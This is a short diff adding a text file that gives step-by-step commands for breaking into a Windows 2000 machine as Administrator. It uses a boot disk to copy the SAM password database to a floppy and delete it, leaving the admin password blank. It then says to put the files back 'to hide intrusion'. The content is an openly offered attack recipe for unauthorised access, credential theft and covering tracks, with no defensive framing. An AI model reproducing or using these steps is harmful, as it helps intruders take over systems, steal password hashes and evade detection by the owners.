@@ -1,0 +1,14 @@
+Get in windows 2000 as Administrator.
+>
+> NOTE: Requires a boot disk.
+>
+> Get the command prompt and go to C:\winnt\sytem32\config\ and do
+the following commands:
+> attrib -a -r -h
+> copy sam.* a:\
+> del Sam.*
+>
+> reboot the computer. there should be no administrator password.
+just put in administrator and hit enter. replace the sam files to
+restore the password to hide intrusion.
+
